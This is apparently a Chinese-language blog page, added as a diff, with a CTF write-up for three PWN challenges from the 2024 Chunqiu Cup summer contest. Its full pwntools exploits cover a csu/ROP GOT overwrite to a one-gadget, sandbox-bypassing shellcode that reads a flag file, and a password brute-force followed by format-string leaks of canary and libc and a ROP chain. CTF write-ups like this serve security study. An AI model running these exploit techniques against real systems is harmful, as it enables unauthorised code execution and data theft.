@@ -1,0 +1,433 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2024 春秋杯网络安全联赛夏季赛 - PWN · Y0uYuGe</title>
+<meta name="description" content="gadget 不够，所以用 csu 中的：通过一个特殊的 ROP gadget 修改 GOT 表，再用 gadget 满足 onegadget 的约束条件，最后调用被覆盖的 GOT 表项。没有时间限制也没有次数限制，所以可以爆破（26*7 次），然后触发格式化字符串泄露 canary 和 libc 地址，再溢出并 ROP 绕过沙箱。然后写 shellcode 即可（没有栈，用 mmap 分配的内存充当栈，存放字符串和 iovec 结构体）。该函数在 Linux 和类 Unix 系统中用于从文件描述符指定的文件中读取数据，但与普通的不同。如果读取失败，函数将返回。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups">题解</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024">2024 年</a></nav>
+    <h1>2024 春秋杯网络安全联赛夏季赛 - PWN</h1>
+    <div class="meta"><time>2024-07-10</time><span class="tag">#Web 安全</span><span class="tag">#安全</span><span class="tag">#Pwn</span><span class="tag">#ROP</span></div>
+    <article class="post-body">
+<h1 id="stdout">stdout</h1>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-001-358837f6ac.png" alt="图片">
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-002-644f6eb374.png" alt="图片">
+溢出并返回到 vuln
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-003-80eee9ed5d.png" alt="图片">
+然后 ROP</p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-004-39a7a56027.png" alt="图片"></p>
+<h2 id="测试">测试</h2>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    //setvbuf(stdout, 0LL, 0, 0LL);
+    setvbuf(stdin, 0LL, 2, 0LL);
+    char a[20];
+    printf(&quot;ouput1.\n&quot;);
+    gets(a);
+    printf(&quot;ouput2.\n&quot;);
+
+
+    return 0;
+}
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-005-0b5d959366.png" alt="图片">
+取消注释后
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-006-c2649127d9.png" alt="图片"></p>
+<h2 id="绕过-setvbufstdout-0ll-2-0ll">绕过 setvbuf(stdout, 0LL, 2, 0LL)</h2>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    setvbuf(stdout, 0LL, 0, 0LL);
+    setvbuf(stdin, 0LL, 2, 0LL);
+    char a[20];
+    printf(&quot;ouput1.\n&quot;);
+    gets(a);
+    setvbuf(stdout, 0LL, 2, 0LL);
+    printf(&quot;ouput2.\n&quot;);
+    gets(a);
+
+    return 0;
+}
+</code></pre>
+<p>执行 <code> setvbuf(stdout, 0LL, 2, 0LL);</code> 之后，可以看到之前缓冲区里的内容被输出了
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-007-6552337a87.png" alt="图片"></p>
+<h2 id="或者一直输出直到缓冲区填满">或者一直输出直到缓冲区填满</h2>
+<h2 id="使用-systembinsh-或-onegadget即使-setvbufstdout-0ll-0-0ll-也能立即回显">使用 system(&quot;/bin/sh&quot;) 或 onegadget，即使 setvbuf(stdout, 0LL, 0, 0LL); 也能立即回显</h2>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    setvbuf(stdout, 0LL, 0, 0LL);
+    setvbuf(stdin, 0LL, 2, 0LL);
+    char a[20];
+    printf(&quot;ouput1.\n&quot;);
+    gets(a);
+    //setvbuf(stdout, 0LL, 2, 0LL);
+    system(&quot;/bin/sh&quot;);
+    gets(a);
+
+    return 0;
+}
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-008-76c948d079.png" alt="图片"></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+typedef void (*func_ptr)();
+func_ptr onegadget;
+
+int main() {
+    setvbuf(stdout, 0LL, 0, 0LL);
+    setvbuf(stdin, 0LL, 2, 0LL);
+    char a[20];
+    printf(&quot;ouput1.\n&quot;);
+    char* put_addr=&amp;puts;
+    onegadget=put_addr-0x84420+0xe3afe;
+    asm(&quot;mov r12,0&quot;);
+    printf(&quot;%p&quot;,put_addr);
+    //setvbuf(stdout, 0LL, 2, 0LL);
+    onegadget();
+    //system(&quot;/bin/sh&quot;);
+
+
+    return 0;
+}
+</code></pre>
+<p>发现可以
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-009-94509eaa5d.png" alt="图片"></p>
+<h2 id="参考-httpsstarrysky1004githubio202407052024-shu-qi-xue-xi-ji-l">参考 <a href="https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/#toc-heading-4">https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/#toc-heading-4</a></h2>
+<p>显式调用 fflush 函数
+流被关闭（调用 fclose）
+程序正常终止（调用 exit）</p>
+<h2 id="思路">思路</h2>
+<p>gadget 不够，所以用 csu 中的。通过一个特殊的 ROP gadget 修改 GOT 表，再用 gadget 满足 onegadget 的约束条件，最后调用被覆盖的 GOT 表项
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-010-dcef5e9f40.png" alt="图片"></p>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+p = process(&#39;./pwn&#39;)
+elf=ELF(&quot;./pwn&quot;)
+# p=remote(&quot;8.147.128.163&quot;,16035)
+# gdb.attach(p,&quot;b main&quot;)
+# pause()
+
+elf=ELF(&quot;./pwn&quot;)
+
+ret_addr=0x000000000040125D
+stdout=0x0000000000404070
+csu=0x00000000004013CA 
+setvbuf=elf.plt[&quot;setvbuf&quot;]
+read=elf.got[&quot;read&quot;]
+put=elf.plt[&quot;puts&quot;]
+print(hex(read))
+rbp=8*b&quot;\xff&quot;
+payload=b&quot;a&quot;*0x50+rbp+p64(ret_addr)
+p.sendline(payload)
+#payload=b&quot;a&quot;*0x1f+rbp+p64(csu)+p64(1)+p64(2)+p64(stdout)+p64(0)+p64(0)+p64(0)+p64(0x00000000004013B0 ) +p64(2)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(setvbuf)
+# .text:00000000004013B0                 mov     rdx, r14
+# .text:00000000004013B3                 mov     rsi, r13
+# .text:00000000004013B6                 mov     edi, r12d
+# .text:00000000004013B9                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]
+# .text:00000000004013BD                 add     rbx, 1
+# .text:00000000004013C1                 cmp     rbp, rbx
+# .text:00000000004013C4                 jnz     short loc_4013B0
+# .text:00000000004013CA                 pop     rbx
+# .text:00000000004013CB                 pop     rbp
+# .text:00000000004013CC                 pop     r12
+# .text:00000000004013CE                 pop     r13
+# .text:00000000004013D0                 pop     r14
+# .text:00000000004013D2                 pop     r15
+# .text:00000000004013D4                 retn
+
+# 0x00000000004011fc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+#extent + csu                                                                                                                                                                                      
+payload=b&quot;a&quot;*0x1f+rbp+p64(0x0000000000401287)+p64(csu)+  p64(0x5f6e4-6)+p64(0x0000000000404018+0x3d)+p64(0)+p64(0)+p64(0)+p64(0)  +p64(0x00000000004011fc )  +p64(0x0000000000401287)
+p.sendline(payload)
+
+p.interactive()
+
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-011-313c658a5e.png" alt="图片"></p>
+<h1 id="shuffle">shuffle</h1>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-012-75bb2c3a8e.png" alt="图片">
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-013-c0b5ef8831.png" alt="图片"></p>
+<p>用 openat、mmap、writev 读取 flag，或者 openat preadv2 writev 等</p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-014-ecd5312561.png" alt="图片">
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-015-99f1b7de18.png" alt="图片"></p>
+<p>用零字节绕过 shuffle（零字节前最多只能有一个非零字节）
+然后写 shellcode 即可（没有栈，用 mmap 分配的内存充当栈，存放字符串和 iovec 结构体）</p>
+<h2 id="exp-1">exp</h2>
+<pre><code class="language-python">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+p = process(&#39;./pwn&#39;)
+elf=ELF(&quot;./pwn&quot;)
+# p=remote(&quot;8.147.128.163&quot;,16035)
+gdb.attach(p,&quot;b main&quot;)
+pause()
+
+
+shellcode = &#39;&#39;&#39;mov eax,0 &#39;&#39;&#39;  #寄存器都被设置为零 push 0出现段错误
+# shellcode += shellcraft.openat(0xffffff9c,&quot;flag&quot;,0)#openat(AT_FDCWD,&quot;flag&quot;,O_RDONLY)
+# shellcode +=shellcraft.mmap(0,0x100,1, 1,3,0) #mmap(0,0x100,PROT_READ, MAP_SHARED,3,0)
+# shellcode +=shellcraft.writev(1,&#39;rax&#39;,0x100)
+#  0x1337000:	mov    rax,0x0
+# =&gt; 0x1337007:	push   0x67616c66
+#    0x133700c:	mov    rsi,rsp
+#    0x133700f:	mov    edi,0xffffff9c
+#    0x1337014:	xor    edx,edx
+#    0x1337016:	xor    eax,eax
+#    0x1337018:	mov    ax,0x101
+#    0x133701c:	syscall 
+#    0x133701e:	push   0x1
+#    0x1337020:	pop    r10
+#    0x1337022:	push   0x3
+#    0x1337024:	pop    r8
+#    0x1337026:	xor    r9d,r9d
+#    0x1337029:	xor    edi,edi
+#    0x133702b:	mov    esi,0x1010201
+#    0x1337030:	xor    esi,0x1010301
+#    0x1337036:	mov    rdx,r10
+#    0x1337039:	push   0x9
+#    0x133703b:	pop    rax
+#    0x133703c:	syscall 
+#    0x133703e:	push   0x1
+#    0x1337040:	pop    rdi
+#    0x1337041:	xor    edx,edx
+#    0x1337043:	mov    dh,0x1
+#    0x1337045:	mov    rsi,rax
+#    0x1337048:	push   0x14
+#    0x133704a:	pop    rax
+#    0x133704b:	syscall 
+
+shellcode+=&#39;&#39;&#39;
+mov rdi,0
+mov rsi,0x10
+mov rdx,3
+mov r10,0x22
+mov r8,0xffffffff
+mov r9,0
+mov rax,0x9
+syscall
+mov rsp,rax
+add rsp,24
+push 0x67616c66
+
+mov edi, 0xffffff9c
+mov    rsi, rsp
+xor    edx,edx
+xor    eax,eax
+mov    ax,0x101
+syscall 
+mov rdi,0
+mov rsi,0x100
+mov rdx,1
+mov r10,1
+mov r8,3
+mov r9,0
+mov rax,0x9
+syscall
+
+push 0x20
+push rax
+mov rdi,0x1
+mov rsi,rsp
+mov rdx,1
+mov rax,0x14
+syscall
+&#39;&#39;&#39;
+payload=asm(shellcode)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>测试代码如下，照着它写 shellcode 即可</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;unistd.h&gt;
+#include&lt;sys/stat.h&gt;
+#include&lt;fcntl.h&gt;
+#include&lt;sys/types.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+int main()
+{
+    int fd = openat(AT_FDCWD,&quot;flag&quot;,O_RDONLY);
+    if(fd==-1){
+        printf(&quot;openat error!&quot;);
+    }
+    char*addr=mmap(0,0x100,PROT_READ, MAP_SHARED,fd,0);
+    char*addr_=mmap(NULL, 0x10, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+    write(1,addr,0x100);
+
+
+    struct iovec iov;
+    char str[] = &quot;Hello &quot;;
+    
+    // 准备 iovec 结构体
+    iov.iov_base = str;
+    iov.iov_len  = strlen(str);
+
+    // 使用 writev() 写入数据
+    ssize_t n = writev(1, &amp;iov, 1);
+
+
+    return 0;
+}
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-016-083c26c9b3.png" alt="图片"></p>
+<h1 id="savetheprincess">savetheprincess</h1>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-017-538b2b473b.png" alt="图片">
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-018-e5a2e6b6a7.png" alt="图片">
+用 openat+pread+write 绕过</p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-019-2e369a91a2.png" alt="图片">
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-020-3007b82afd.png" alt="图片"></p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-021-79f4e44d12.png" alt="图片"></p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-022-ff4bba8d66.png" alt="图片">
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-023-f398612a50.png" alt="图片">
+没有时间限制也没有次数限制，所以可以爆破，26*7 次。然后触发格式化字符串泄露 canary 和 libc 地址，再溢出并 ROP 绕过沙箱
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-024-f8965e7232.png" alt="图片">
+把 buf 填满，打印 buf 时会把 i 也一起打印出来，这样就能判断 i 是否自增，从而判断当前字节是否爆破正确</p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-025-0eaa18c5bd.png" alt="图片">
+找不到控制第六个参数的 gadget，所以把 mmap 换成 pread，或者<strong>用 mprotect 让栈可执行（注意要页对齐），再用 openat、mmap、write 写 shellcode 读取 flag</strong>
+pread 无法从终端读取，所以要事先泄露一个栈地址，把 flag 文件名放在栈上</p>
+<h2 id="pread">pread</h2>
+<p><code>pread()</code> 函数在 Linux 和类 Unix 系统中用于从文件描述符指定的文件中读取数据，但与普通的 <code>read()</code> 函数不同，<code>pread()</code> 允许指定从文件中的哪个偏移处开始读取</p>
+<p><code>pread()</code> 的原型如下：</p>
+<pre><code class="language-c">#include &lt;unistd.h&gt;
+
+ssize_t pread(int fd, void *buf, size_t count, off_t offset);
+</code></pre>
+<h3 id="参数">参数</h3>
+<ul>
+<li><code>fd</code>：文件描述符，指向要从中读取数据的文件。</li>
+<li><code>buf</code>：指向存放读取数据的缓冲区的指针。</li>
+<li><code>count</code>：要读取的字节数。</li>
+<li><code>offset</code>：读取操作的起始偏移，相对于文件开头，以字节为单位。</li>
+</ul>
+<h3 id="返回值">返回值</h3>
+<p><code>pread()</code> 返回实际读取的字节数。如果读取失败，函数返回 <code>-1</code>，并设置 <code>errno</code> 变量来指示错误原因。</p>
+<h3 id="示例代码">示例代码</h3>
+<p>下面是一个使用 <code>pread()</code> 的代码示例：</p>
+<pre><code class="language-c">#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(void) {
+    int fd;
+    char buffer[100];
+    off_t offset = 100;  // 从文件的第100字节开始读取
+    ssize_t bytes_read;
+
+    // 打开文件
+    fd = open(&quot;testfile.txt&quot;, O_RDONLY);
+    if (fd == -1) {
+        perror(&quot;open&quot;);
+        exit(EXIT_FAILURE);
+    }
+
+    // 使用 pread 从文件的特定位置读取数据
+    bytes_read = pread(fd, buffer, sizeof(buffer), offset);
+    if (bytes_read == -1) {
+        perror(&quot;pread&quot;);
+        close(fd);
+        exit(EXIT_FAILURE);
+    }
+
+    // 输出读取的数据
+    buffer[bytes_read] = &#39;\0&#39;;  // 确保字符串以 null 字符终止
+    printf(&quot;Read %ld bytes: %s\n&quot;, bytes_read, buffer);
+
+    // 关闭文件描述符
+    close(fd);
+
+    return 0;
+}
+</code></pre>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-python">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+p = process(&#39;./pwn&#39;)
+elf=ELF(&quot;./pwn&quot;)
+lib = ELF(&#39;./libc.so.6&#39;)
+# p=remote(&quot;8.147.128.163&quot;,16035)
+gdb.attach(p,&quot;b main&quot;)
+pause()
+
+
+password=&quot;&quot;
+for i in range(8):
+    for j  in range(26):
+        p.sendlineafter(b&quot;&gt; \n&quot;,str(1))
+        pwd=password
+        pwd+=chr(ord(&quot;a&quot;)+j )
+        p.sendafter(b&quot;please input your password: \n&quot;,pwd.ljust(10,&quot;a&quot;))
+        result=p.recvuntil(b&quot;!!!\n&quot;,drop=True)
+        print(pwd,&quot; &quot;,result)
+        print(i+1,&quot; &quot;,result)
+    
+        if b&quot;successfully&quot; in result:
+            password=pwd
+            print(&quot;suceessful&quot;)
+            payload=b&quot;%9$p%11$p%10$p%15$p&quot;   # canary pie libc
+            p.send(payload)
+            break
+        if i+1 in result:
+            password=pwd
+            print(&quot;right&quot;)
+            break
+
+        print(&quot;error&quot;)
+
+
+canary=int(p.recv(18),16)
+pie=int(p.recv(14),16)-0x17be
+stack=int(p.recv(14),16)+0xa8+0x10
+libc=int(p.recv(14),16)-0x29d90
+openat_add=lib.sym[&quot;openat&quot;]+libc
+pread_add=lib.sym[&quot;pread64&quot;]+libc
+write_add=lib.sym[&quot;write&quot;]+libc
+print(hex(canary),hex(pie),hex(libc))
+p.sendlineafter(b&quot;&gt; \n&quot;,str(2))
+
+pop_rdi=libc+0x000000000002a3e5
+pop_rsi=libc+0x000000000002be51
+pop_rdx_r12=libc+0x000000000011f2e7
+pop_r10=pie+0x00000000000017d5
+pop_r8_mov_rax_1=libc+0x00000000001659e6
+pop_rax=libc+0x0000000000045eb0
+syscall=libc+0x0000000000029db4
+pop_rdx=libc+0x000000000003d1ee
+
+payload=56*b&quot;a&quot;+p64(canary)+p64(0)+p64(pop_rdi) +p64(0xffffffffffffff9c)+p64(pop_rsi)+p64(stack)+p64(pop_rdx_r12)+p64(0)+p64(0)+p64(openat_add)
+payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+ p64(pie+0x4000)+p64(pop_rdx_r12)+p64(0x10)+p64(0x10)+p64(pop_rdx)+p64(0)+p64(pread_add)
+payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+ p64(pie+0x4000)+p64(pop_rdx_r12)+p64(0x10)+p64(0x10)+p64(write_add)
+payload+=b&quot;flag\x00&quot;
+p.sendlineafter(b&quot;Attack the dragon!!\n&quot;,payload)
+p.interactive()
+
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B%20-%20PWN/assets/csdn-140205290/image-026-f35667db32.png" alt="图片"></p>
+
+    </article>
+    
+    <nav class="pn"><span></span><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20%E4%BA%AC%E9%BA%9F%20CTF%20-%20MazeCodeV1/"><span class="l">下一篇</span>2024 京麟 CTF - MazeCodeV1</a></nav>
+  </main>
+  <aside class="toc"><div class="toc-h">目录</div><a class="d2" href="#测试">测试</a><a class="d2" href="#绕过-setvbufstdout-0ll-2-0ll">绕过 setvbuf(stdout, 0LL, 2, 0LL)</a><a class="d2" href="#或者一直输出直到缓冲区填满">或者一直输出直到缓冲区填满</a><a class="d2" href="#使用-systembinsh-或-onegadget即使-setvbufstdout-0ll-0-0ll-也能立即回显">使用 system(&amp;quot;/bin/sh&amp;quot;) 或 onegadget，即使 setvbuf(stdout, 0LL, 0, 0LL); 也能立即回显</a><a class="d2" href="#参考-httpsstarrysky1004githubio202407052024-shu-qi-xue-xi-ji-l">参考 https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/#toc-heading-4</a><a class="d2" href="#思路">思路</a><a class="d2" href="#exp">exp</a><a class="d2" href="#exp-1">exp</a><a class="d2" href="#pread">pread</a><a class="d3" href="#参数">参数</a><a class="d3" href="#返回值">返回值</a><a class="d3" href="#示例代码">示例代码</a><a class="d2" href="#exp-2">exp</a></aside>
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
